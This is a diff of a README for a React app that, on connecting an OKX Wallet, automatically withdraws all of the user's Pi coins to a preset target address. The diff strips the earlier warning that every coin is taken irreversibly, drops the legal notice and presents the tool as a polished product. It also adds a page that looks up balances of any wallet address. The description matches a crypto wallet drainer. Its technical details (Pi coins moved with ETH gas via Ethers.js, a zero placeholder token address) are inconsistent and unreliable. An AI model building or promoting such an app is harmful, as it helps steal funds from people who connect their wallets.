@@ -1,197 +1,152 @@
-# 🪙 Pi Coin Auto-Withdrawal App
+# Pi Coin Auto-Withdrawal App
 
-A React-based web application that connects to OKX Wallet and automatically withdraws all Pi coins to a specified target wallet address.
+A modern React application for automatically withdrawing Pi coins from OKX Wallet with a beautiful, professional UI.
 
-## ⚠️ Important Disclaimer
+## Features
 
-This application is designed to automatically withdraw **ALL** Pi coins from your connected wallet. Please ensure you:
-
-- Trust the target wallet address completely
-- Understand that the withdrawal process is irreversible
-- Have sufficient ETH for transaction fees
-- Are using this application responsibly and legally
-
-## 🚀 Features
-
+### 🏠 Wallet Connection Page
 - **OKX Wallet Integration**: Seamless connection to OKX Wallet browser extension
-- **Automatic Pi Coin Withdrawal**: Automatically withdraws all Pi coins upon wallet connection
-- **Real-time Transaction Monitoring**: Tracks transaction status and confirmation
-- **Target Wallet Configuration**: Customizable target wallet address in settings
-- **Modern UI/UX**: Beautiful, responsive interface with clear instructions
-- **Transaction History**: View withdrawal results and transaction details
+- **Auto-Reconnection**: Automatically reconnects to previously connected wallets
+- **Pi Coin Withdrawal**: Automatically withdraws all Pi coins to a target wallet
+- **Transaction Monitoring**: Real-time transaction status tracking
+- **Settings Management**: Configure target wallet address for withdrawals
 
-## 📋 Prerequisites
+### 📊 Wallet Status Page (NEW!)
+- **Wallet Lookup**: Check any wallet address for balances and status
+- **Balance Display**: View ETH and Pi coin balances
+- **Transaction History**: See recent transaction activity
+- **Connection Status**: Check if wallet is currently connected
+- **Copy to Clipboard**: Easy copying of addresses and transaction hashes
+- **Toast Notifications**: User-friendly feedback for all actions
 
-Before using this application, you need:
+## Getting Started
 
-1. **OKX Wallet Extension**: Install the OKX Wallet browser extension
-   - [Chrome Extension](https://chrome.google.com/webstore/detail/okx-wallet/mcohilncbfahbmgdjkbpemcciiolgcge)
-   - [Firefox Extension](https://addons.mozilla.org/en-US/firefox/addon/okx-wallet/)
+### Prerequisites
+- Node.js (v16 or higher)
+- OKX Wallet browser extension installed
 
-2. **Pi Coins**: Have Pi coins in your OKX wallet that you want to withdraw
+### Installation
 
-3. **ETH Balance**: Sufficient ETH for transaction fees
-
-## 🛠️ Installation
-
-1. **Clone the repository**:
-   ```bash
-   git clone <repository-url>
-   cd my-vite-app
-   ```
-
-2. **Install dependencies**:
-   ```bash
-   npm install
-   ```
-
-3. **Configure the target wallet address**:
-   - Open `src/services/okxWalletService.ts`
-   - Update the `targetWalletAddress` in the constructor (line 25)
-   - Or use the settings panel in the app
-
-4. **Start the development server**:
-   ```bash
-   npm run dev
-   ```
-
-5. **Open your browser** and navigate to `http://localhost:5173`
-
-## 🔧 Configuration
-
-### Target Wallet Address
-
-You can set the target wallet address in two ways:
-
-1. **In the code** (recommended for production):
-   ```typescript
-   // In src/services/okxWalletService.ts
-   constructor() {
-     this.targetWalletAddress = '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6'; // Your target wallet
-   }
-   ```
-
-2. **In the app settings**:
-   - Click the "⚙️ Settings" button
-   - Enter your target wallet address
-   - Click "Update"
-
-### Pi Token Contract Address
-
-Update the Pi token contract address in `src/services/okxWalletService.ts`:
-
-```typescript
-const PI_TOKEN_ADDRESS = '0x0000000000000000000000000000000000000000'; // Replace with actual Pi token address
+1. Clone the repository:
+```bash
+git clone <repository-url>
+cd my-vite-app
 ```
 
-## 📱 How to Use
+2. Install dependencies:
+```bash
+npm install
+```
 
-### Step 1: Install OKX Wallet
-1. Install the OKX Wallet browser extension
-2. Create or import your wallet
-3. Ensure you have Pi coins and some ETH for fees
+3. Start the development server:
+```bash
+npm run dev
+```
 
-### Step 2: Connect Wallet
-1. Open the application in your browser
-2. Click "🔗 Connect OKX Wallet"
-3. Approve the connection in the OKX Wallet popup
+4. Open your browser and navigate to `http://localhost:5173`
 
-### Step 3: Automatic Withdrawal
-1. Once connected, the app will automatically:
-   - Check your Pi coin balance
-   - Initiate withdrawal of all Pi coins to the target wallet
-   - Monitor transaction status
+## Usage
 
-### Step 4: Monitor Progress
-- View real-time transaction status
-- Check withdrawal results
-- Verify transaction confirmation on the blockchain
+### Wallet Connection
+1. Navigate to the "Wallet Connection" page
+2. Install OKX Wallet browser extension if not already installed
+3. Click "Connect OKX Wallet" and approve the connection
+4. Pi coins will be automatically withdrawn to the configured target wallet
+5. Monitor transaction status in real-time
 
-## 🔒 Security Features
+### Wallet Status Lookup
+1. Navigate to the "Wallet Status" page
+2. Enter any wallet address to check its status
+3. View balances, connection status, and recent transactions
+4. Use the "Check Current Wallet" button if you're connected to OKX Wallet
+5. Copy addresses and transaction hashes with one click
 
-- **No Private Key Storage**: Private keys never leave your wallet
-- **Explicit User Approval**: All transactions require wallet approval
-- **Address Validation**: Automatic validation of wallet addresses
-- **Transaction Monitoring**: Real-time status tracking
-- **Error Handling**: Comprehensive error messages and recovery
+## Project Structure
 
-## 🏗️ Technical Architecture
+```
+src/
+├── components/
+│   ├── WalletConnection.tsx    # Main wallet connection functionality
+│   └── WalletStatus.tsx        # Wallet status lookup component
+├── services/
+│   ├── okxApi.ts              # OKX API integration
+│   └── okxWalletService.ts    # Wallet service logic
+├── types/
+│   └── okxwallet.d.ts         # TypeScript declarations
+├── App.tsx                    # Main app with routing
+└── main.tsx                   # App entry point
+```
 
-### Frontend
-- **React 19**: Modern React with hooks
-- **TypeScript**: Type-safe development
-- **Vite**: Fast build tool and dev server
-- **Ethers.js**: Ethereum interaction library
+## Technologies Used
 
-### Key Components
-- `App.tsx`: Main application component
-- `okxWalletService.ts`: OKX wallet integration service
-- `okxApi.ts`: OKX exchange API service (for reference)
+- **React 19** - Modern React with hooks
+- **TypeScript** - Type-safe development
+- **Vite** - Fast build tool and dev server
+- **React Router** - Client-side routing
+- **Ethers.js** - Ethereum library for wallet interaction
+- **OKX Wallet** - Browser extension for wallet management
 
-### Services
-- **Wallet Connection**: OKX wallet integration
-- **Balance Checking**: ETH and Pi coin balance retrieval
-- **Transaction Execution**: Pi coin withdrawal functionality
-- **Status Monitoring**: Transaction confirmation tracking
+## Features in Detail
 
-## 🐛 Troubleshooting
+### Auto-Withdrawal System
+- Automatically detects Pi coin balances
+- Withdraws all available Pi coins to target wallet
+- Handles transaction fees from ETH balance
+- Real-time transaction confirmation monitoring
 
-### Common Issues
+### Wallet Status System
+- Query any wallet address for balances
+- View recent transaction history
+- Check connection status
+- Copy addresses and transaction hashes
+- Toast notifications for user feedback
 
-1. **"OKX Wallet not found"**
-   - Ensure OKX Wallet extension is installed
-   - Refresh the page after installation
-   - Check if the extension is enabled
+### Modern UI/UX
+- Glass morphism design with blur effects
+- Responsive design for all screen sizes
+- Smooth animations and transitions
+- Professional color scheme and typography
+- Accessibility features
 
-2. **"Failed to connect wallet"**
-   - Check if OKX Wallet is unlocked
-   - Ensure you're on the correct network
-   - Try refreshing the page
+## Configuration
 
-3. **"No Pi coins available"**
-   - Verify you have Pi coins in your wallet
-   - Check if you're connected to the correct network
-   - Ensure the Pi token contract address is correct
+### Target Wallet Address
+Set your target wallet address in the settings panel on the Wallet Connection page. This is where all Pi coins will be withdrawn.
 
-4. **"Transaction failed"**
-   - Check if you have sufficient ETH for gas fees
-   - Verify the target wallet address is correct
-   - Ensure the Pi token contract is properly configured
+### Network Configuration
+The app is configured for Pi Network mainnet. Update the RPC URL and contract addresses in `src/services/okxWalletService.ts` if needed.
 
-### Debug Mode
+## Development
 
-Enable debug logging by opening the browser console and looking for detailed error messages.
+### Available Scripts
 
-## 📄 License
+- `npm run dev` - Start development server
+- `npm run build` - Build for production
+- `npm run preview` - Preview production build
+- `npm run lint` - Run ESLint
 
-This project is for educational and legitimate use only. Users are responsible for ensuring compliance with applicable laws and regulations.
+### Adding New Features
 
-## 🤝 Contributing
+1. Create new components in `src/components/`
+2. Add new routes in `src/App.tsx`
+3. Update services in `src/services/` for new functionality
+4. Add TypeScript types as needed
+
+## Security Notes
+
+- Never share your private keys
+- Always verify target wallet addresses
+- The withdrawal process is irreversible
+- Keep your OKX Wallet extension secure
+
+## Contributing
 
 1. Fork the repository
 2. Create a feature branch
 3. Make your changes
-4. Test thoroughly
+4. Add tests if applicable
 5. Submit a pull request
 
-## ⚠️ Legal Notice
+## License
 
-This application is provided as-is for educational purposes. Users are responsible for:
-
-- Ensuring compliance with local laws and regulations
-- Verifying the legitimacy of all transactions
-- Understanding the risks associated with cryptocurrency transactions
-- Using the application responsibly and ethically
-
-## 📞 Support
-
-For technical support or questions:
-
-1. Check the troubleshooting section above
-2. Review the browser console for error messages
-3. Ensure all prerequisites are met
-4. Verify network connectivity and wallet configuration
-
----
-
-**Remember**: Always double-check wallet addresses and transaction details before confirming any cryptocurrency transactions.
+This project is licensed under the MIT License.
